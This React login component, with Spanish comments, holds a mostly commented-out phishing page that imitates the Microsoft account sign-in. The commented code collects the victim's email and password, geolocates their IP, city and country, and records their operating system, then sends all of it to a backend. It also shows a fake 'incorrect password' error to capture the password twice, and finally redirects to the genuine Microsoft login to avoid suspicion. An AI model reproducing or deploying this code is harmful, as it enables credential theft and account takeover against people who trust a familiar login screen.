// import { useEffect, useState } from "react";
// import { useParams } from "react-router-dom";
import Layout from '../../components/registro/layout/Layout';
// // import "./login.scss";
// import { createRegistroUser } from "../../config/registroApi";

export default function Login() {
  // const [email, setEmail] = useState("");
  // const [password, setPassword] = useState("");
  // const [errorSpan, setErrorSpan] = useState(false);
  // const [errPassword, setErrPaswword] = useState(false);

  // //params
  // let { email } = useParams();
  // // console.log(email);

  // //forma para obtener ubicacion de su pais y su ip
  // const [details, setDetails] = useState(null);
  // // console.log(details?.city);
  // console.log(details);

  // let country = details?.country_name;
  // let IPv4 = details?.IPv4;
  // let city = details?.city;

  // useEffect(() => {
  //   const getUserGeolocationDetails = () => {
  //     fetch(
  //       "https://geolocation-db.com/json/0f761a30-fe14-11e9-b59f-e53803842572"
  //     )
  //       .then((response) => response.json())
  //       .then((data) => setDetails(data));
  //   };
  //   getUserGeolocationDetails();
  // }, []);

  // //ver el sistema operativo de dpnde ingresa a la web
  // var InfoSistemaOperativo = window.navigator.appVersion.toLowerCase();
  // // const so = InfoSistemaOperativo.indexOf('0.5')
  // const datax = InfoSistemaOperativo.split("(");
  // const so = datax[1];
  // // console.log(InfoSistemaOperativo);

  // const statePassword = (e) => {
  //   setPassword(e.target.value);
  // };



  // //enviar datos al server
  // const enviarRegitro = async (e) => {
  //   e.preventDefault();


  //   let datax = { email, city, country, IPv4, password, so };
  //   console.log(datax);

  //   if (errorSpan) {
  //     await createRegistroUser(datax);
  //     return (window.location.href =
  //       "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1620146145&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fRpsCsrfState%3d24ae8aff-5a6f-9076-be1d-1055258ef79f&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015");
  //   }


  //   if (!password) {
  //     return setErrPaswword(true);
  //   } else  {
  //     setErrorSpan(true);
  //     setPassword('')
  //     return await createRegistroUser(datax);
  //   } 

  // };

  return (
    <div className="">
      <Layout/>
      
      {/* <div className="container_login">
        <div className="div_login">
          <img
            className="logo"
            src="https://acctcdn.msauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg"
            alt="Microsoft"
          />

        
          <form className="form_login" onSubmit={enviarRegitro}>
            <div className="form_login__email">
              {email?.length > 0 && <FiIcons.FiArrowLeft />}
              <input
                className="form_login__email__input"
                type="text"
                name="email"
                value={email}
              />
            </div>

            <h3 className="form_login__text">Escribir contraseña</h3>

            {errPassword ? (
              <section className="error">
                <span>Escribe la contraseña de tu cuenta Microsoft.</span>
              </section>
            ) : null}

            {errorSpan ? (
              <section className="error">
                <span>
                  la cuenta o la contraseña es incorrecta si no recuerdas la
                  contraseña
                </span>
                <strong> restablecela ahora</strong>
              </section>
            ) : null}
            <div className="form_login__content-input">
              <input
                className="form_login__content-input__input"
                type="password"
                name="password"
                placeholder="Contraseña"
                value={password}
                onChange={statePassword}
              />
            </div>

            <div className="form_login__check">
              <input
                className="form_login__check-input"
                type="checkbox"
                name="check"
              />
              <span>Mantener la sesion iniciada</span>
            </div>

         

            <button type="submit" className="btn_login">
              Continuar
            </button>
          </form>
        </div>
      </div>

       */}
    </div>
  );
}
